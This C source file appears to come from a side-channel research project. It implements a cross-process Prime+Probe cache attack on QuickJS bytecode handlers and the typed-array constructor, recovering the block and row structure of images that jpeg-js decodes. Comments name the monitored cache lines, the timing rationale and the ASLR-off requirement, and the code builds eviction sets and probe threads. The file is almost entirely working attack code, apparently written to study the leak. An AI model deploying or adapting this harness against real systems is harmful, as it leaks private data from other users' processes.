/*
 * Bytecode-handler attack on the jpeg-js IDCT (paper 5.2).
 *
 * quantizeAndInverse takes a short path for a row or column whose AC
 * coefficients are all zero and runs the full butterfly otherwise, so per-block
 * complex-path work is a block-resolution image. The monitored lines are chosen
 * by WHERE INSIDE A BLOCK they fire:
 *   slot0  mul       dense through the 64-iteration dequant loop (block START),
 *                    then ~16 more per complex pass.
 *   slot1  sar       ~20 per complex pass, then dense through the 64-iteration
 *                    output loop (block END).
 *   slot2  row_mark  js_typed_array_constructor (exported as llct_ta_ctor), the
 *                    C routine behind `new Uint8Array(...)`. buildComponentData
 *                    allocates 8 output lines at the head of every image ROW and
 *                    quantizeAndInverse allocates none.
 *
 * buildComponentData's 8x8 copy loop sits BETWEEN two blocks and runs neither
 * mul nor sar, so the silences of the merged mul+sar stream are the block
 * boundaries; a row boundary is the block silence that also holds the row
 * marker's burst. Neither handler works alone -- mul is silent through the
 * output loop and sar through the dequant loop, so each one on its own cuts a
 * block in half. All of these are shared quickjs code at a stable address
 * (ASLR off), so this is a cross-process Prime+Probe.
 *
 * Environment overrides: QJ_SLOT0 / QJ_SLOT1 as "<opcode>+<line>", QJ_SLOT3 to
 * shift the row-marker line, QJ_MAX_CYCLES to bound the capture window.
 * QJ_SLOT2 opts in to a fourth line -- `sub` is emitted only by the butterflies,
 * so it is a complexity channel with no constant baseline, but measured against
 * ground truth it adds almost nothing and its extra Prime+Probe thread makes
 * every eviction set noticeably worse.
 */
#include "arch.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "cache/cache_param.h"
#include "quickjs_runtime.h"
#include "dsp.h"
#include "shared_memory.h"

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <math.h>
#include <pthread.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <x86intrin.h>

static uint64_t victim_runs = 1;
static const char *test_name = "quickjs_jpeg_js";
static char *js_eval_file;

enum { cache_line_count = 4, profile_iterations = 1 << 20 };
static int active_lines = 3;
/* One decode ends near 3.5e8 cycles; the rest of a longer capture is noise. */
static uint64_t max_exec_cycles = (uint64_t)8e8;
static uint64_t probe_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];

static pthread_barrier_t attacker_threads_barrier;

/* Cache-line-aligned dispatch-table entry of an opcode's handler. */
static uintptr_t opcode_base(const char *name) {
	struct { const char *name; uintptr_t base; } op_map[] = {
		{ "goto16", target_goto16 }, { "shl", target_shl },
		{ "sub", target_sub },       { "sar", target_sar },
		{ "mul", target_mul },       { "mod", target_mod },
		{ "goto8", target_goto8 },   { "if_false8", target_if_false8 },
		{ "get_loc_check", target_get_loc_check },
	};
	for (size_t k = 0; k < sizeof(op_map) / sizeof(op_map[0]); ++k) {
		if (!strcmp(op_map[k].name, name)) {
			return op_map[k].base;
		}
	}
	return 0;
}

int main(int argc, char **argv) {
	pthread_t threads[cache_line_count];
	PP_attacker_thread_config_t cfg[cache_line_count];
	int err;

	get_config();
	init_sync_ctx(QUICKJS_PROJ_ID);
	quickjs_get_bytecode_handler_cacheline();

	srand(time(NULL));

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!\n");
		return 1;
	}

	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		probe_time[i] = probe_time_arr[i];
	}

	char lbl[3][32] = { "mul", "sar", "sub" };
	int off[3] = { 0, 0, 0 };
	const char *env[3] = { getenv("QJ_SLOT0"), getenv("QJ_SLOT1"),
		                   getenv("QJ_SLOT2") };
	for (int i = 0; i < 2; ++i) {
		if (env[i]) {
			sscanf(env[i], "%31[^+]+%d", lbl[i], &off[i]);
		}
	}
	int n_op = 2;
	if (env[2] && env[2][0] && strcmp(env[2], "none")) {
		sscanf(env[2], "%31[^+]+%d", lbl[2], &off[2]);
		n_op = 3;
		active_lines = 4;
	}
	const char *e3 = getenv("QJ_SLOT3"), *ec = getenv("QJ_MAX_CYCLES");
	int off3 = e3 ? atoi(e3) : 0;
	if (ec) {
		max_exec_cycles = (uint64_t)atof(ec);
	}

	for (int i = 0; i < n_op; ++i) {
		uintptr_t base = opcode_base(lbl[i]);
		if (base == 0) {
			log_error("Unknown target opcode for slot%d: %s", i, lbl[i]);
			return 1;
		}
		cfg[i] = (PP_attacker_thread_config_t){
			.label = lbl[i],
			.slot = i,
			.target = base + (uintptr_t)off[i] * CACHE_LINE_SIZE
		};
		PP_thread_config_init(cfg[i]);
	}

	cfg[n_op] = (PP_attacker_thread_config_t){
		.label = "row_mark",
		.slot = n_op,
		.target = ((uintptr_t)llct_ta_ctor & CACHE_LINE_MASK) +
		          (uintptr_t)off3 * CACHE_LINE_SIZE
	};
	PP_thread_config_init(cfg[n_op]);

	log_info("Targets: slot0=%s+%d slot1=%s+%d slot2=%s row_mark+%d "
	         "lines=%d max_cycles=%lu",
	         lbl[0], off[0], lbl[1], off[1],
	         n_op == 3 ? lbl[2] : "none", off3, active_lines,
	         max_exec_cycles);

	for (int i = 0; i < active_lines; ++i) {
		prepare_evset_thres(cfg[i].target, &cfg[i].evset, &cfg[i].threshold);
		if (cfg[i].evset == NULL || cfg[i].threshold == 0) {
			log_error("Cannot build evset for slot%d (%s)", i, cfg[i].label);
			return 1;
		}
	}
	log_info("Build evset for all %d targets", active_lines);

	if (pthread_barrier_init(
	        &attacker_threads_barrier, NULL, active_lines) != 0) {
		log_error("Error initializing barrier\n");
		return -1;
	}

	log_info("Prime+Probe wait for the warmup run");
	pthread_barrier_wait(sync_ctx.barrier);
	log_info("Prime+Probe wait for the warmup done");

	for (int i = 0; i < active_lines; ++i) {
		err = pthread_create(&threads[i], NULL, PP_attacker_thread, &cfg[i]);
		if (err != 0) {
			log_error("can't create thread%d :[%s]", i, strerror(err));
		}
	}
	for (int i = 0; i < active_lines; ++i) {
		pthread_join(threads[i], NULL);
	}

	pthread_barrier_destroy(&attacker_threads_barrier);

	return 0;
}
